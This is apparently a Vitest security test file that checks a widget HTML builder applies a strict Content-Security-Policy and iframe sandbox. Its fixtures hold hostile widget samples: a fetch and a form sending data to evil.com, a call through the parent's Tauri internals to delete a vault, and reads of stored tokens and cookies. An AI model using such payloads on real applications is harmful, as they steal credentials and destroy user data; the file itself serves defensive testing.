import { describe, it, expect } from "vitest";
import { buildWidgetHtml } from "./widgetHtmlBuilder";

describe("widgetAdversarialSecurity: sandbox and security verification", () => {
  it("verifies CSP strictly prohibits outbound network fetch/XHR via connect-src 'none'", () => {
    const maliciousWidget = `
      <script>
        fetch("https://evil.com/leak", { method: "POST", body: "sensitive" })
          .catch(e => console.error(e));
      </script>
    `;
    const html = buildWidgetHtml(maliciousWidget, "adv-fetch");
    expect(html).toContain("connect-src 'none'");
    expect(html).toContain("default-src 'none'");
    expect(html).not.toContain("connect-src *");
  });

  it("verifies iframe sandbox forbids same-origin access preventing parent.__TAURI_INTERNALS__ escape", () => {
    const maliciousWidget = `
      <script>
        try {
          window.parent.__TAURI_INTERNALS__.invoke("delete_vault");
        } catch(e) {
          window.lastError = e;
        }
      </script>
    `;
    const html = buildWidgetHtml(maliciousWidget, "adv-tauri");
    // Verify neither allow-same-origin nor allow-top-navigation are ever present
    expect(html).not.toContain("allow-same-origin");
    expect(html).not.toContain("allow-top-navigation");
  });

  it("verifies form-action is blocked to prevent data exfiltration via form submit", () => {
    const maliciousWidget = `
      <form action="https://evil.com/phish" method="POST">
        <input name="pwd" value="secret" />
        <button type="submit">Submit</button>
      </form>
    `;
    const html = buildWidgetHtml(maliciousWidget, "adv-form");
    expect(html).toContain("form-action 'none'");
  });

  it("verifies storage isolation under opaque null origin", () => {
    const maliciousWidget = `
      <script>
        try {
          const token = window.localStorage.getItem("token");
          const cookie = document.cookie;
        } catch(e) {
          // Expected SecurityError in sandboxed iframe
        }
      </script>
    `;
    const html = buildWidgetHtml(maliciousWidget, "adv-storage");
    // Without the same-origin flag, origin is opaque null, locking down localStorage and cookies
    expect(html).not.toContain("allow-same-origin");
  });
});
